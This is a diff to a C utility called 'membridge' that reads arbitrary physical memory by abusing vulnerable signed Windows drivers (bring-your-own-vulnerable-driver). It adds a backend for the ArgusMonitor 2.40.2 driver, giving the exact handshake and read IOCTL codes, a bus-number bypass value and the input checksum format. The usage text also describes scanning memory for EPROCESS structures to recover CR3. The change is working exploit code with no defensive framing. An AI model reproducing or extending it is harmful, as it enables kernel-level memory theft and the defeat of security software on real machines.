@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX, LY_MRT } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX, LY_MRT, LY_ARGUS } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -111,6 +111,9 @@ static const backend_t g_backends[] = {
     { L"fekern_byov", L"drivers\\byov_input\\fekern.sys",
       BK_CONTROL, L"MembridgeFekernByov", L"\\\\.\\fekern_00", LY_MRT, 1,
       L"fekern.sys byov_input variant (MRT-compatible physical read; CR3 page validated PML4E)" },
+    { L"argusmonitor", L"drivers\\argusmonitor_new\\ArgusMonitor_2.40.2.sys",
+      BK_CONTROL, L"MembridgeArgus", L"\\\\.\\ArgusMonitorCTLD", LY_ARGUS, 1,
+      L"ArgusMonitor 2.40.2 WHQL (handshake 0x9C402B74 + single-shot physical read 0x9C402994; arbitrary PA)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -150,6 +153,7 @@ static const char *layout_name(layout_t l) {
     case LY_TDEIO: return "tdeio";
     case LY_ICACHEX: return "icachex";
     case LY_MRT: return "mrt";
+    case LY_ARGUS: return "argusmonitor";
     }
     return "?";
 }
@@ -795,6 +799,49 @@ static int read_mrt(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return 1;
 }
 
+// ArgusMonitor 2.40.2 (WHQL, LOLDrivers): handshake 0x9C402B74 with 0x200 zero
+// keypad (disables XOR), then single-shot physical read 0x9C402994.
+// Single-shot input is 32 bytes: {u64 pa; u32 busNum=0xFF; u32 width=1; pad...;
+// u16 additive checksum big-endian at offset 30}. Output 24 bytes, value at 0.
+static int argus_handshake_done = 0;
+static int read_argus(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    DWORD ret = 0;
+    if (!argus_handshake_done) {
+        uint8_t hs_in[0x200];
+        uint8_t hs_out[0x210];
+        memset(hs_in, 0, sizeof(hs_in));
+        memset(hs_out, 0, sizeof(hs_out));
+        if (DeviceIoControl(dev, 0x9C402B74u, hs_in, sizeof(hs_in), hs_out, sizeof(hs_out), &ret, NULL)) {
+            argus_handshake_done = 1;
+        } else {
+            wprintf(L"[WARN] argus handshake err=%lu; trying read anyway\n", GetLastError());
+        }
+    }
+    uint32_t done = 0;
+    while (done < size) {
+        uint8_t in[32];
+        uint8_t o[24];
+        memset(in, 0, sizeof(in));
+        memset(o, 0, sizeof(o));
+        *(uint64_t *)(in + 0) = pa + done;
+        *(uint32_t *)(in + 8) = 0xFF;  // busNum bypass
+        *(uint32_t *)(in + 12) = 1;    // width
+        uint16_t sum = 0;
+        for (int i = 0; i < 30; i++) sum = (uint16_t)(sum + in[i]);
+        in[30] = (uint8_t)(sum >> 8);
+        in[31] = (uint8_t)(sum & 0xFF);
+        if (!DeviceIoControl(dev, 0x9C402994u, in, sizeof(in), o, sizeof(o), &ret, NULL)) {
+            wprintf(L"[ERR] argus single-shot read err=%lu\n", GetLastError());
+            return 0;
+        }
+        uint32_t n = size - done;
+        if (n > 4) n = 4;
+        memcpy(out + done, o, n);
+        done += n;
+    }
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -812,6 +859,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_TDEIO: return read_tdeio(dev, pa, size, out);
     case LY_ICACHEX: return read_icachex(dev, pa, size, out);
     case LY_MRT: return read_mrt(dev, pa, size, out);
+    case LY_ARGUS: return read_argus(dev, pa, size, out);
     }
     return 0;
 }
@@ -965,7 +1013,7 @@ static void usage(void) {
     wprintf(L"  membridge --locate-selftest  (offline synthetic EPROCESS scan test)\n");
     wprintf(L"  membridge --backend <id> --locate --pid <pid> --name <exe> --scan-start <hex> --scan-size <hex>\n");
     wprintf(L"               (physical scan for EPROCESS -> CR3; Win11 26200 offsets)\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex|mrt>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex|mrt|argus>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -1037,6 +1085,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"tdeio") == 0) g_manual_layout = LY_TDEIO;
         else if (_wcsicmp(layout, L"icachex") == 0) g_manual_layout = LY_ICACHEX;
         else if (_wcsicmp(layout, L"mrt") == 0 || _wcsicmp(layout, L"fekern") == 0) g_manual_layout = LY_MRT;
+    else if (_wcsicmp(layout, L"argus") == 0 || _wcsicmp(layout, L"argusmonitor") == 0) g_manual_layout = LY_ARGUS;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
